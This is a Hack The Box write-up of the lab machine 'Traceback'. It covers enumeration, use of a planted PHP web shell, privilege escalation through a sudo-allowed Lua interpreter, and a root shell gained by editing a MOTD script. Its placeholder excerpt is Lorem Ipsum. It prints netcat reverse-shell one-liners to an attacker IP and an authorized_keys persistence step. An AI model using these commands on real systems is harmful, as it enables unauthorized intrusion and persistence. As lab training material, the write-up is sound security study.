---
layout: single
title: Traceback - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-04-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-traceback/traceback_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-traceback/traceback_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/traceback# nmap -Pn -sC -sV -n 10.10.10.181
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
  |   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
  |_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Help us
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


  DIRB:
  + http://traceback.htb/index.html (CODE:200|SIZE:1113)
  + http://traceback.htb/server-status (CODE:403|SIZE:301)

  NIKTO:
  -


2. Visiting the webpage tells us that the site has been owned and they've left a backdoor. Inspecting the code we find a comment
   "Some of the best web shells that you might need ;)". Googling "best web shells you might need" and the first site that pops up
   is a github repo with 16 diffrenet webshells.

   Copy the name of all the shells and add them to a custom wordlist. Use ffuf with the wordlist to find entry point.

   root@p3:/opt/htb/machines/traceback# cat shell-list.txt
    alfa3.php
    alfav3.0.1.php
    andela.php
    bloodsecv4.php
    by.php
    c99ud.php
    cmd.php
    configkillerionkros.php
    jspshell.jsp
    mini.php
    obfuscated-punknopass.php
    punk-nopass.php
    punkholic.php
    r57.php
    smevk.php
    wso2.8.5.php

  root@p3:~# ffuf -c -w /opt/htb/machines/traceback/shell-list.txt -u http://traceback.htb/FUZZ

          /'___\  /'___\           /'___\
         /\ \__/ /\ \__/  __  __  /\ \__/
         \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
          \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
           \ \_\   \ \_\  \ \____/  \ \_\
            \/_/    \/_/   \/___/    \/_/

         v1.0-rc1
  ________________________________________________

   :: Method           : GET
   :: URL              : http://traceback.htb/FUZZ
   :: Follow redirects : false
   :: Calibration      : false
   :: Timeout          : 10
   :: Threads          : 40
   :: Matcher          : Response status: 200,204,301,302,307,401,403
  ________________________________________________

  smevk.php               [Status: 200, Size: 1261, Words: 318, Lines: 59]


3. Browsing to http://traceback.htb/smevk.php we are prompted with a login, looking through the code of smevk.php the default
   credentials are admin:admin. Executing this gives us access to the webshell.


4. Setup a local ncat listener and get a reverse shell using a nc reverse one-liner.

    Webshell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 4488 >/tmp/f

    root@p3:~# nc -lvnp 4488
      listening on [any] 4488 ...
      connect to [10.10.14.26] from (UNKNOWN) [10.10.10.181] 46118
      /bin/sh: 0: can't access tty; job control turned off
      $ whoami
      webadmin

    Upgrade the shell from TTY0.


5. User webadmin doesn't have user.txt in his home dir, however we find note.txt saying;
    $ cat note.txt
      - sysadmin -
      I have left a tool to practice Lua.
      I'm sure you know where to find it.
      Contact me if you have any question.

    Executing 'sudo -l' we find that sysadmin can execute '/home/sysadmin/luvit' without password. We need to research how to get
    a shell using lua.


6. Googling for LUA Command Execution it seems that we can use the syntax 'os.execute(COMMAND)'. We create a new .lua-file and
   create a new shell.

    webadmin@traceback:/dev/shm$ cat privesc.lua
      os.execute("/bin/sh")

    webadmin@traceback:/dev/shm$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
      $ whoami
        sysadmin
      $ pwd
        /home/sysadmin
      $ cat user.txt
        f7a5bca29a0cdd67acba531d9550b636


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. In /opt we find a motd-file containing;
    $ cat /opt/owned.msg
      #################################
      -------- OWNED BY XH4H  ---------
      - I guess stuff could have been configured better ^^ -
      #################################

    If the motd has been defaced, we can use this to execute vulnerable code to grant a reverse root shell. However to trigger it
    we need to login using SSH.


2. Create a new ssh-key and add the public key to sysadmin's authorized_keys.

    root@p3:/opt/htb/machines/traceback# ssh-keygen
      Generating public/private rsa key pair.
      Enter file in which to save the key (/root/.ssh/id_rsa): /opt/htb/machines/traceback/sysadmin-id_rsa
      Enter passphrase (empty for no passphrase):
      Enter same passphrase again:
      Your identification has been saved in /opt/htb/machines/traceback/sysadmin-id_rsa.
      Your public key has been saved in /opt/htb/machines/traceback/sysadmin-id_rsa.pub.

    root@p3:/opt/htb/machines/traceback# cat sysadmin-id_rsa.pub
      ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkmo0hX72gdRRA76cwb1WudNaG9c0IvdH+zb3te3KKz9fBrDdUkCaOat7dd+zqFXBavb89LjMkCYWymnQcggyndR+yCAZr3/eYJRB+iZBjVpqxKJsHOL2m/3zwk+yLGQxz+Z/IKA7IKC89RdP5DKf7HhBhPnx0Hgg1CKRUs1ey9BrJhRo6yhCKT/fYofczg3OIBLYQYhyR5Tr2oyszrlhguPuA8SmUhoeK4sHvvWWhx1sq4qLeuHRLFM2xmJ/e5NKMWy+vgtiJTcl2WRl7/OVKNK2LHReoudUHv6AvRZp8VwpNcHES59SslHInrP/j6wQ/IdnXEG41Lk6I2j1vsVTYCQ462kf2vvSvlqxhpWhrysgSn+cCGSC+rgPUC3WTNpbTbdXPfiY7+VGbpuf7x/dffe56d+hm0Z+mzoMo1Bj3rTzRYX/ltpAypBebaUnsGtkbLzOHGaLna3F3i6yiK3YpFE0HOWmEky8jElP9q/4adoLeofNM19mf/g0FA5COzHk= root@p3


3. Copy the public key to /home/sysadmin/.ssh/authorized_keys and login using SSH.
    root@p3:/opt/htb/machines/traceback# ssh sysadmin@traceback.htb -i sysadmin-id_rsa
      The authenticity of host 'traceback.htb (10.10.10.181)' can't be established.
      ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
      Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
      Warning: Permanently added 'traceback.htb,10.10.10.181' (ECDSA) to the list of known hosts.
      #################################
      -------- OWNED BY XH4H  ---------
      - I guess stuff could have been configured better ^^ -
      #################################

      Welcome to Xh4H land

      Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
      $ whoami
        sysadmin


4. Edit the motd header (/etc/update-motd.d/00-header) and add a nc reverse shell in the script

    $ cat 00-header
      #!/bin/sh
      ..
      echo "\nWelcome to Xh4H land \n"
      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 4400 >/tmp/f

    Start a nc listener and login as sysadmin to trigger the reverse shell.

    root@p3:~# nc -lvnp 4400
    listening on [any] 4400 ...
    connect to [10.10.14.26] from (UNKNOWN) [10.10.10.181] 50498
    /bin/sh: 0: can't access tty; job control turned off
    # whoami
      root
    # cat /root/root.txt
      b359a978f9b54e5d538fcbe4ffd4eaa8


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Webshell:
  https://github.com/TheBinitGhimire/Web-Shells

LUA Command Execution:
  https://stackoverflow.com/questions/9676113/lua-os-execute-return-value

MOTD Tampering:
  https://blog.haao.sh/writeups/fowsniff-writeup/
